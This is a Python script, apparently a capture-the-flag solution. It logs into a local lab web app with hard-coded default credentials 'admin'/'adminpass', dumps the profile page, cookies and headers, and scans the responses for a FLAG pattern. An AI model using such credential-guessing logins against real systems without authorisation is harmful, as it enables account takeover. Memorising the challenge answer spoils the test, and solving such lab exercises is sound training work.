import requests
import re

# Create session to maintain cookies
session = requests.Session()

# Target URLs
login_url = "http://127.0.0.1:32878/login"
profile_url = "http://127.0.0.1:32878/profile"

print("[*] Attempting login...")
print(f"[*] POST {login_url}")

# Login with credentials
login_data = {
    'username': 'admin',
    'password': 'adminpass'
}

try:
    # POST login request - allow redirects
    login_response = session.post(
        login_url,
        data=login_data,
        allow_redirects=True
    )
    
    print(f"[+] Login Status: {login_response.status_code}")
    print(f"[+] Login Response Length: {len(login_response.content)}B")
    print(f"[+] Final URL after redirects: {login_response.url}")
    
    # Display cookies received
    if session.cookies:
        print(f"[+] Session Cookies: {dict(session.cookies)}")
    else:
        print("[-] No cookies received")
    
    print(f"\n[+] Login Response:\n{login_response.text}\n")
    
    # Now access the profile page with authenticated session
    print(f"[*] Accessing profile page...")
    print(f"[*] GET {profile_url}")
    
    profile_response = session.get(profile_url)
    
    print(f"[+] Profile Status: {profile_response.status_code}")
    print(f"[+] Profile Response Length: {len(profile_response.content)}B")
    print(f"[+] Profile Headers: {dict(profile_response.headers)}")
    
    print(f"\n[+] COMPLETE PROFILE PAGE RESPONSE:")
    print("=" * 80)
    print(profile_response.text)
    print("=" * 80)
    
    # Search for FLAG{} pattern
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, profile_response.text)
    
    if flags:
        print(f"\n[!] FLAG FOUND!")
        for flag in flags:
            print(f"[!] {flag}")
    else:
        print(f"\n[-] No FLAG{{}} pattern found in profile response")
    
    # Also search in login response just in case
    login_flags = re.findall(flag_pattern, login_response.text)
    if login_flags:
        print(f"\n[!] FLAG FOUND IN LOGIN RESPONSE!")
        for flag in login_flags:
            print(f"[!] {flag}")

except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")
except Exception as e:
    print(f"[-] Error: {e}")

